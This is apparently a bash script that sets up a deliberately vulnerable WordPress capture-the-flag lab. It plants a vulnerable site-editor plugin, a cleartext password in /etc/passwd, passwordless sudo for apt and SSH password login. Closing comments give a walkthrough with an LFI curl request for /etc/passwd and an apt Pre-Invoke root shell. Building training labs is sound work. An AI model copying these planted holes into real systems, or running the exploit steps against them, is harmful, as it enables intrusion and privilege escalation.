#!/bin/bash

if [[ $(/usr/bin/id -u) -ne 0 ]]; then
    echo "Run this as root"
    exit
fi

while true; do
    read -p "Did you run 'sudo apt upgrade' and restart the instance? " yn
    case $yn in
        [Yy]* ) make install; break;;
        [Nn]* ) exit;;
        * ) echo "Please answer yes or no.";;
    esac
done

printf "\n\033[33;1mRun sudo apt upgrade and restart the machine before runnning this script\033[0m\n"

read -p 'enter ec2 instance DNS name: ' dnsname
password="w0rdpr355I54ann0y1NG"

updateUbuntu(){
	sudo apt update
	sudo apt install  apache2 \
                 ghostscript \
                 libapache2-mod-php \
                 mysql-server \
                 php \
                 php-bcmath \
                 php-curl \
                 php-imagick \
                 php-intl \
                 php-json \
                 php-mbstring \
                 php-mysql \
                 php-xml \
                 php-zip \
                 unzip  --yes
}

phpUpdate(){
	sudo sed -i 's/upload_max_filesize = 2M/upload_max_filesize = 20M/' /etc/php/8.1/apache2/php.ini
}
makeWWW(){
	sudo mkdir -p /srv/www
	sudo chown www-data: /srv/www
	wget https://wordpress.org/latest.tar.gz
	sudo -u www-data tar zx -f latest.tar.gz -C /srv/www 
	sudo echo '<VirtualHost *:80>
    	DocumentRoot /srv/www/wordpress
    	<Directory /srv/www/wordpress>
        	Options FollowSymLinks
        	AllowOverride Limit Options FileInfo
        	DirectoryIndex index.php
        	Require all granted
    	</Directory>
    	<Directory /srv/www/wordpress/wp-content>
        	Options FollowSymLinks
        	Require all granted
    	</Directory>
		</VirtualHost>' > /etc/apache2/sites-available/wordpress.conf
}

mysqlStuff(){
	sudo mysql --user=root --execute="CREATE DATABASE wordpress;"
	sudo mysql --user=root --execute="CREATE USER wordpress@localhost IDENTIFIED BY 'w0rdpr355I54ann0y1NG';"
	sudo mysql --user=root --execute=" GRANT ALL PRIVILEGES ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES"
	sudo service mysql start
}

wordPress(){
	sudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php
	sudo -u www-data sed -i 's/database_name_here/wordpress/' /srv/www/wordpress/wp-config.php
	sudo -u www-data sed -i 's/username_here/wordpress/' /srv/www/wordpress/wp-config.php
	sudo -u www-data sed -i "s/password_here/$password/" /srv/www/wordpress/wp-config.php
	sudo -u www-data sed -i -e '$adefine("WP_MEMORY_LIMIT", "256M");' /srv/www/wordpress/wp-config.php 
	sudo a2ensite wordpress
	sudo a2enmod rewrite
	sudo a2dissite 000-default
	sudo service apache2 reload
}

moreWordpress(){
	cd /srv/www/wordpress/wp-content/plugins
	sudo wget https://www.exploit-db.com/apps/5be8270e880c445e11c59597497468bb-site-editor.zip
	sudo unzip *.zip
	rm *.zip
	cd /tmp;sudo curl -O https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
	sudo chmod +x wp-cli.phar
	sudo mv wp-cli.phar /usr/local/bin/wp
	cd /srv/www/wordpress/
	sudo rm -rf wp-content/plugins/akismet
	sudo -u www-data wp core install --url=$dnsname --title="Super Real Site" --admin_user=jeff --admin_email='jeff@localhost.com' 1>/root/wordpressadmin.txt
	sleep 2
	sudo -u www-data wp post create --post_title="New Update to Super Real Site!" --post_content="We’re proud to announce that we’ve recently installed new plugins to help our collaborators make the most out of this website. Don’t forget to try them out!" --post_status=publish
	#sudo -u www-data wp post create --post_title="Be Aggressive! B. E. Agressive!" --post_content="The UM cheerleaders have finally brought home the gold thanks to their agressive efforts. We could all learn a thing or two about being aggressive from this team. You should try being aggressive too!" --post_status=publish
}

userStuff(){
	sudo useradd -s /bin/bash -p $(perl -e'print crypt("w0rdpr355I54ann0y1NG", "aa")') -m -N steve
	sudo echo "steve ALL=(root) NOPASSWD: /usr/bin/apt" >> /etc/sudoers
	sudo sed -i 's/1001:100:/1001:100:w0rdpr355I54ann0y1NG/' /etc/passwd
	sudo sed -i 's/PasswordAuthentication no/PasswordAuthentication yes/' /etc/ssh/sshd_config
	sudo systemctl reload sshd
	sudo echo -ne "$dnsname root"|md5sum > /root/proof.txt
	sudo echo -ne "$dnsname local"|md5sum > /home/steve/local.txt

}

printf "\n\033[33;1mupdating/installing software\033[0m\n"
updateUbuntu 
printf "\n\033[33;1mmaking directories\033[0m\n"
makeWWW
printf "\n\033[33;1mconfiguring mysql\033[0m\n"
mysqlStuff
printf "\n\033[33;1minstalling wordpress\033[0m\n"
wordPress
printf "\n\033[33;1mchanging php.ini\033[0m\n"
phpUpdate
printf "\n\033[33;1minstall plugins/update database/post content\033[0m\n"
moreWordpress
printf "\n\033[33;1mcreate user/set sudo and ssh permissions\033[0m\n"
userStuff
#sudo usermod -s /sbin/nologin ubuntu
#exit
#exit

# make sure ubuntu and kali are on same network/vpc
# make sure kali allows 445 or some ports inbound

###############

# Walkthrough
# nmap -sCV from internal IP finds 22/80
# wpscan --url http:// site --plugins-detection aggressive
# finds site-editor plugin
# LFI on plugin /etc/passwd finds cleartext password
# curl http:// site /wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
# ssh in as steve
# sudo -l finds apt usage
# sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh